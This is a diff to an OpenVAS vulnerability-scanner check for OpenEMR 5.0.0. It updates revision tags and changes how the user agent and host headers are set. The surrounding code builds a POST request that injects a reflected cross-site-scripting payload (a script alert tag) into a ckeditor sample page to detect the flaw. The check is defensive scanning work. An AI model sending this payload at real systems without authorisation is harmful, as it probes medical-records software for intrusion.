@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_openemr_mult_vuln.nasl 10838 2018-08-08 12:05:36Z cfischer $
+# $Id: gb_openemr_mult_vuln.nasl 11008 2018-08-16 13:26:16Z cfischer $
 #
 # OpenEMR 5.0.0 Multiple Vulnerabilities
 #
@@ -25,11 +25,11 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-if( description )
+if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.113110");
-  script_version("$Revision: 10838 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-08-08 14:05:36 +0200 (Wed, 08 Aug 2018) $");
+  script_version("$Revision: 11008 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-16 15:26:16 +0200 (Thu, 16 Aug 2018) $");
   script_tag(name:"creation_date", value:"2018-02-13 13:30:33 +0100 (Tue, 13 Feb 2018)");
   script_tag(name:"cvss_base", value:"9.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:C/I:C/A:C");
@@ -60,7 +60,7 @@ if( description )
   script_xref(name:"URL", value:"https://www.sec-consult.com/en/blog/advisories/os-command-injection-reflected-cross-site-scripting-in-openemr/index.html");
   script_xref(name:"URL", value:"http://www.open-emr.org/wiki/index.php/OpenEMR_Patches");
 
-  exit( 0 );
+  exit(0);
 }
 
 CPE = "cpe:/a:open-emr:openemr";
@@ -71,6 +71,9 @@ include( "http_func.inc" );
 if( ! port = get_app_port( cpe: CPE ) ) exit( 0 );
 if( ! location = get_app_location( cpe: CPE, port: port ) ) exit( 0 );
 
+useragent = get_http_user_agent();
+host = http_host_name( port: port );
+
 timestamp = ereg_replace( string: gettimeofday(), pattern: ".", replace: "_" );
 exploit_url = location + "/library/custom_template/ckeditor/_samples/assets/_posteddata.php";
 exploit_url = ereg_replace( string: exploit_url, pattern: "//", replace: "/" );
@@ -78,8 +81,8 @@ exploit_pattern = "<script>alert('" + timestamp + "');</script>";
 exploit = exploit_pattern + "=SENDF";
 
 req = 'POST ' + exploit_url + ' HTTP/1.1\r\n';
-req += 'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n';
-req += 'Host: ' + http_host_name( port: port ) + '\r\n';
+req += 'User-Agent: ' + useragent + '\r\n';
+req += 'Host: ' + host + '\r\n';
 req += 'Accept: */*\r\n';
 req += 'Content-Length: ' + strlen( exploit ) + '\r\n';
 req += 'Content-Type: application/x-www-form-urlencoded\r\n\r\n';
